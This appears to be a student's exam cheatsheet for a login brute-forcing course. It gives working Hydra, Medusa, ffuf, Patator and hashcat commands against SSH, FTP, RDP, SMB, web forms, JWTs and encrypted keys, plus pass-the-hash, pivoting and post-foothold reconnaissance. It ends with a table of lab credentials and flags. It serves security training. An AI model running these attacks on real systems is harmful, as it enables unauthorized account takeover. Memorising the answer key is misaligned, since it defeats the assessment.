# Login Brute Forcing — Exam Cheatsheet

---

## Attack Decision Tree

```
1. What service?           → pick tool + module below
2. Know the username?      → use -l, skip -L
3. Know the policy?        → filter wordlist with grep first
4. Have OSINT on target?   → CUPP > generic lists
5. Service on localhost?   → SCP wordlist in, attack from inside SSH
```

---

## Hydra — Common Commands

### Basic Auth (HTTP GET)
```bash
hydra -l USER -P wordlist.txt TARGET http-get /PATH -s PORT -f
```
> Brute-forces HTTP Basic Authentication (Hyper Text Transfer Protocol). `-l` is a single username, `-P` is the password wordlist, and `-f` stops after the first success. Adjust `/PATH` to the protected page and `-s PORT` if not on port 80.

### Web Login Form (POST)
```bash
hydra -l USER -P wordlist.txt TARGET -s PORT -f \
  http-post-form "/path:user=^USER^&pass=^PASS^:F=Invalid credentials"
```
> Brute-forces a web login form that submits via POST. `^USER^` and `^PASS^` are replaced each attempt. `F=Invalid credentials` tells Hydra the response text that indicates failure. Get the field names from the page source or Burp.

### SSH
```bash
hydra -l USER -P wordlist.txt ssh://TARGET -s PORT -f -t 4
```
> Brute-forces SSH (Secure Shell). `-t 4` limits to 4 threads — SSH rate-limits aggressive connections. Use a small thread count to avoid lockouts or bans.

### FTP
```bash
hydra -l USER -P wordlist.txt ftp://TARGET -f -t 10
```
> Brute-forces FTP (File Transfer Protocol). `-t 10` is safe for most FTP servers. Increase threads only if the server allows many concurrent connections.

### RDP
```bash
hydra -l USER -P wordlist.txt rdp://TARGET -f
# RDP slow + locks accounts FAST — use small list, low threads (-t 1)
```
> Brute-forces Remote Desktop Protocol (RDP). RDP is slow to respond and locks accounts after just a few failures. Always use a very small, targeted wordlist and `-t 1` to avoid locking out the account.

### SMB / WinRM / MSSQL / PostgreSQL / MySQL / VNC
```bash
hydra -L users.txt -P pws.txt smb://TARGET -f -t 1     # SMB — locks after ~5
hydra -L users.txt -P pws.txt -s 5985 TARGET http-post-form ...   # WinRM via HTTP
hydra -L users.txt -P pws.txt mssql://TARGET -f
hydra -L users.txt -P pws.txt postgres://TARGET -f
hydra -L users.txt -P pws.txt mysql://TARGET -f
hydra -P pws.txt vnc://TARGET                          # VNC: no username
hydra -L users.txt -P pws.txt telnet://TARGET -t 4
hydra -L users.txt -P pws.txt -m "PLAIN" smtp://TARGET # SMTP AUTH
hydra -L users.txt -P pws.txt pop3s://TARGET           # POP3 over TLS
hydra -L users.txt -P pws.txt imaps://TARGET
hydra -l USER -P pws.txt -s 5432 ldap2://TARGET        # LDAP simple bind
```

### Pass-the-Hash with hydra (SMB)
```bash
hydra -l Administrator -p 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' smb://TARGET
# Format: LM:NT — use empty LM hash (aad3b...) if only NT known
```
> Pass-the-Hash attack against SMB (Server Message Block). Provide the NTLM hash directly instead of a plaintext password. The `aad3b435...` is the empty LM hash — use it when you only have the NT hash.

### http-post-form Condition String
```
"/path:user=^USER^&pass=^PASS^:F=error string"   # fail if response contains string
"/path:user=^USER^&pass=^PASS^:S=302"             # succeed on HTTP 302 redirect
"/path:user=^USER^&pass=^PASS^:S=Dashboard"       # succeed if response contains string
```

> Get form params from: View Source → `action` path + input `name` attrs, or Burp intercept

---

## Medusa — Common Commands

### SSH
```bash
medusa -h TARGET -n PORT -u USER -P wordlist.txt -M ssh -t 3 -f
```
> Medusa equivalent of the Hydra SSH brute-force. `-h` is host, `-n` is port, `-M ssh` selects the SSH module, `-t 3` limits threads, `-f` stops on first success.

### FTP (from inside SSH session)
```bash
medusa -h 127.0.0.1 -u USER -P /tmp/wordlist.txt -M ftp -t 5 -f
```
> Brute-forces an FTP service listening only on localhost (127.0.0.1). Run this from inside an SSH session on the target because the FTP port is not exposed externally.

### Check empty password + user=pass
```bash
medusa -h TARGET -u USER -e ns -M ssh -f
```
> `-e ns` runs two quick checks before the wordlist: `n` tries an empty password, `s` tries the username as the password. These catch common default credentials in seconds.

### Medusa Modules (Hydra equivalents)
```bash
medusa -d   # list all modules
medusa -M ssh -h TARGET -u USER -P pws.txt
medusa -M ftp -h TARGET -u USER -P pws.txt
medusa -M http -h TARGET -m DIR:/admin -u USER -P pws.txt   # HTTP Basic on /admin
medusa -M smbnt -h TARGET -u USER -P pws.txt                # SMB NTLM
medusa -M mssql -h TARGET -u sa -P pws.txt
medusa -M rdp -h TARGET -u USER -P pws.txt
medusa -M postgres -h TARGET -u postgres -P pws.txt
medusa -M vnc -h TARGET -p pws.txt
```

---

## ffuf for Web Login Bruteforce (fastest)

When the form is plain HTTP, ffuf is faster than hydra and more reliable for modern apps.

```bash
# Basic password brute (response size differs between pass/fail):
ffuf -w pws.txt:FUZZ -u http://TARGET/login -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs 2046

# 302 redirect on success:
ffuf -w pws.txt:FUZZ -u http://TARGET/login -X POST \
     -d "user=admin&pass=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mc 302

# Dual-fuzz (user + pass simultaneously, pitchfork):
ffuf -w users.txt:USER -w pws.txt:PASS -mode pitchfork \
     -u http://TARGET/login -X POST -d "u=USER&p=PASS" -mc 302

# JSON login:
ffuf -w pws.txt:FUZZ -u http://TARGET/api/login -X POST \
     -d '{"username":"admin","password":"FUZZ"}' \
     -H "Content-Type: application/json" -fs 28

# With CSRF token (extract then submit):
TOKEN=$(curl -s http://TARGET/login | grep -oP 'csrf.*?value="\K[^"]+')
ffuf -w pws.txt:FUZZ -u http://TARGET/login -X POST \
     -d "csrf=$TOKEN&user=admin&pass=FUZZ" -mc 302
# Note: if CSRF rotates per request, this won't work — switch to hydra http-post-form, or write a small Python script
```
> ffuf is faster than Hydra for plain HTTP login forms. Use `-fs` to filter the "wrong password" response size, or `-mc 302` to keep only redirect responses (successful logins). For JSON APIs, set `Content-Type: application/json`. The CSRF token approach only works if the token is static — if it rotates each request, switch to Hydra or a Python script.

---

## Patator — When Hydra/Medusa Misbehave

Patator handles edge cases hydra struggles with (multi-step auth, custom response parsing, modular conditions).

```bash
# HTTP form login:
patator http_fuzz url=http://TARGET/login method=POST \
        body='user=admin&pass=FILE0' 0=pws.txt \
        -x ignore:fgrep='Invalid'

# SSH:
patator ssh_login host=TARGET user=USER password=FILE0 0=pws.txt \
        -x ignore:mesg='Authentication failed'

# DNS subdomain enum (yes — patator does this too):
patator dns_forward domain=FILE0.target.htb 0=subs.txt -x ignore:code=3
```
> Patator uses `FILE0` as the injection placeholder and positional arguments to map wordlists. `-x ignore:fgrep='...'` tells it to discard responses containing that string. Use Patator when Hydra or Medusa handle multi-step authentication poorly.

---

## RDP — Crowbar / xfreerdp loop

```bash
# Crowbar (specifically for RDP — handles NLA better than hydra):
crowbar -b rdp -s TARGET/32 -u USER -C pws.txt

# Manual xfreerdp loop (no lockout monitoring, slow):
while read p; do
  timeout 5 xfreerdp /v:TARGET /u:USER /p:"$p" /cert:ignore 2>&1 | grep -q "Authentication" || echo "HIT: $p"
done < pws.txt
```
> Crowbar is purpose-built for RDP (Remote Desktop Protocol) and handles Network Level Authentication (NLA) better than Hydra. The xfreerdp loop is a manual fallback — slow but works when tools fail. `/32` means a single host (not a subnet range).

---

## SSH Keys — Cracking Encrypted id_rsa

```bash
# Convert encrypted SSH key to hashcat format:
ssh2john id_rsa > id_rsa.hash
# or:
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crack passphrase:
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt   # OpenSSH new format
hashcat -m 22931 ppk.hash /usr/share/wordlists/rockyou.txt      # PuTTY .ppk
```
> `ssh2john` converts an encrypted SSH private key into a hash format that John or Hashcat can crack. Mode `22921` is for modern OpenSSH keys; `22931` is for PuTTY `.ppk` files. Crack the passphrase, then use the key normally with `ssh -i id_rsa`.

---

## JWT / Other Token Brute Force

```bash
# Crack a weak HS256 JWT secret with hashcat:
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# jwt.txt = the full JWT token (header.payload.signature) on one line

# jwt_tool — also handles algorithm confusion attacks:
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Brute weak ZIP / PDF / Office passwords:
zip2john archive.zip > zip.hash; john --wordlist=rockyou.txt zip.hash
pdf2john document.pdf > pdf.hash; john --wordlist=rockyou.txt pdf.hash
office2john doc.docx > office.hash; john --wordlist=rockyou.txt office.hash
```
> JSON Web Tokens (JWTs) signed with a weak HS256 secret can be cracked. Put the full token (all three dot-separated parts) on one line in `jwt.txt`. The `*2john` converters extract crackable hashes from password-protected files.

---

## Stegcracker — Hidden Files in Images

```bash
# Brute steghide passphrase on JPG/BMP:
stegcracker image.jpg /usr/share/wordlists/rockyou.txt
# Recovered file auto-extracted to image.jpg.out

# Or manually after cracking:
steghide extract -sf image.jpg -p 'PASSWORD'
```
> `stegcracker` brute-forces the passphrase on a steganographic image (data hidden inside a JPG or BMP). Once you find the passphrase, `steghide extract` pulls out the hidden file. The recovered file is saved with `.out` appended to the original filename.

---

## Key Flags

| Flag | Hydra | Medusa |
|------|-------|--------|
| Single username | `-l user` | `-u user` |
| Username list | `-L file` | `-U file` |
| Single password | `-p pass` | `-p pass` |
| Password list | `-P file` | `-P file` |
| Threads | `-t 64` | `-t 10` |
| Stop on first hit | `-f` | `-f` (host) / `-F` (any host) |
| Non-default port | `-s PORT` | `-n PORT` |
| Empty/user=pass check | manual | `-e ns` |
| Verbose | `-V` | `-v 4` |

---

## Custom Wordlists

### Username Anarchy
```bash
# Generate username variants from a real name
./username-anarchy Jane Smith > usernames.txt
./username-anarchy Thomas Smith > usernames.txt
```
> Username Anarchy generates every common username format from a full name — `jsmith`, `j.smith`, `smithj`, `jane.smith`, etc. Use this whenever you know a target's real name and need to guess their login username.

### CUPP (password profiling)
```bash
# Interactive
python3 cupp/cupp.py -i

# Non-interactive (pipe answers)
printf "Thomas\nSmith\n\n\n\n\n\n\n\n\n\n\ny\nchocolate\ny\ny\ny\nn\n" \
  | python3 cupp/cupp.py -i
```
> CUPP (Common User Passwords Profiler) builds a personalized password list from OSINT about the target. Run `-i` for an interactive prompt. Pipe answers with `printf` to use it in scripts. The more OSINT you have, the better the list.

### Filter wordlist to password policy
```bash
grep -E '^.{8,}$' list.txt \   # min 8 chars
  | grep -E '[A-Z]' \           # uppercase
  | grep -E '[a-z]' \           # lowercase
  | grep -E '[0-9]' \           # number
  | grep -E '[!@#$%^&*]' \      # special char
  > filtered.txt
```
> Each `grep -E` filters the list to only passwords that match that rule. Chaining them keeps only passwords that satisfy all rules. This shrinks a 10,000-entry list down to a few hundred that actually comply with the target's password policy.

> Add `([!@#$%^&*].*){2,}` if policy requires 2+ special chars

---

## Pivoting to Internal Services

```bash
# Option 1 — SCP wordlist in, attack from inside (most reliable)
sshpass -p 'PASS' scp -P PORT wordlist.txt user@TARGET:/tmp/
sshpass -p 'PASS' ssh -p PORT user@TARGET \
  "hydra -l USER -P /tmp/wordlist.txt ftp://127.0.0.1 -f -t 5"

# Option 2 — SSH local port forward (less stable)
sshpass -p 'PASS' ssh -p PORT -L 2121:127.0.0.1:21 user@TARGET -N -f
hydra -l USER -P wordlist.txt ftp://127.0.0.1:2121 -f -t 5
```
> Option 1 copies the wordlist to the target with SCP (Secure Copy Protocol), then runs Hydra from inside the SSH session — the most reliable approach. Option 2 creates a local port forward so you can attack the internal service from your Kali machine, but this is less stable under load.

---

## Retrieving Content After Cracking

```bash
# Basic Auth
curl -s -u user:pass http://TARGET/

# Web form with session cookie
curl -s -X POST http://TARGET/ -d "user=U&pass=P" -c /tmp/cookies.txt
curl -s -b /tmp/cookies.txt http://TARGET/success

# FTP (when curl not on target — use python)
python3 -c "
import ftplib
ftp = ftplib.FTP()
ftp.connect('127.0.0.1', 21)
ftp.login('USER', 'PASS')
lines = []
ftp.retrlines('RETR flag.txt', lines.append)
print('\n'.join(lines))
ftp.quit()
"
```
> `-u user:pass` sends Basic Auth credentials in every request. `-c cookies.txt` saves the session cookie after a POST login; `-b cookies.txt` sends it back on the next request. The Python ftplib script retrieves a file from FTP when the `ftp` command isn't available on the target.

---

## Post-SSH-Foothold Checklist

```bash
netstat -tulpn | grep LISTEN    # find internal services
nmap localhost                  # confirm services
ls /home                        # find usernames for other services
cat /etc/passwd | grep -v nologin | grep -v false   # valid accounts
```
> Run these after you get an SSH shell. `netstat` shows what's listening on localhost — ports not exposed externally. `/home` directories reveal other user accounts. Filtering `/etc/passwd` removes service accounts that can't log in.

---

## Wordlist Quick Pick

| Situation | Wordlist |
|-----------|----------|
| Fast web attack | `~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt` |
| General password | `/usr/share/wordlists/rockyou.txt` |
| Known target (OSINT) | CUPP → `name.txt` |
| Default device creds | `~/SecLists/Passwords/Default-Credentials/default-passwords.csv` |
| Usernames (quick) | `~/SecLists/Usernames/top-usernames-shortlist.txt` |
| Usernames (thorough) | `~/SecLists/Usernames/xato-net-10-million-usernames.txt` |

---

## Lab Answers

| Section | Creds | Flag / Answer |
|---------|-------|---------------|
| 3 — PIN brute force | PIN: `2321` | `HTB{Brut3_F0rc3_1s_P0w3rfu1}` |
| 4 — Dictionary attack | password: `gateway` | `HTB{Brut3_F0rc3_M4st3r}` |
| 7 — Basic HTTP Auth | `basic-auth-user:Password@123` | `HTB{th1s_1s_4_f4k3_fl4g}` |
| 8 — Login form | `admin:zxcvbnm` | `HTB{W3b_L0gin_Brut3F0rc3}` |
| 10 — SSH + FTP | `sshuser:1q2w3e4r5t` / `ftpuser:qqww1122` | `HTB{SSH_and_FTP_Bruteforce_Success}` |
| 11 — Custom wordlists | `jane:3n4J!!` | `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}` |
| 12 — Skills Assessment 1 | `admin:Admin123` | Part 2 username: `satwossh` |
| 13 — Skills Assessment 2 | `satwossh:password1` / `thomas:chocolate!` | `HTB{brut3f0rc1ng_succ3ssful}` |
